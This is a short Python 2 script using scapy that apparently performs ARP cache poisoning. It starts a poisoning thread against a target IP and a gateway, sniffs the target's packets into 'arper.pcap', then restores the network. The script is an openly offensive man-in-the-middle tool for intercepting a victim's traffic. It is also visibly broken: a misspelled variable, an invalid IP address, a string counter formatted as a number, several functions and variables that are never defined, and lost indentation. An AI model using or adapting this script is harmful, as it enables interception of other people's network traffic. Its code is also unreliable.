from scapy.all import *
import os
import sys
import threading
import signal

interafce  = "en1"
target_ip = "127.16.1.71"
gateway_ip = "172.262.2.2"
packet_count = "1000"

#Setting our interface
conf.iface = interface

#Turning off the output
conf.verb  = 0

print "[*] Gateway %s is at %s" % (gateway_ip,gateway_mac)

target_mac = get_mac(target_ip)

if target_mac is None:
	print "[!!!!] Failed to get the target MAC. Now Exiting."
	sys.exit(0)
else:
	print "[*] Target %s is at %s" % (target_ip,target_mac)

#Starting the poison thread
poison_thread = threading.Thread(target = poison_target, args = (gateway_ip,gateway_mac,target_ip,target_mac))
poison_thread.start()

try:
	print "[*] Starting sniffer for %d packets" % packet_count

	bpf_filter  = "ip host %s" % target_ip
	packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)

	#Writing out the captured packets
	wrpcap('arper.pcap',packets)

	#Restoring the network
	restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

except KeyboardInterrupt:
#Again Restoring the network
restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
sys.exit(0)
							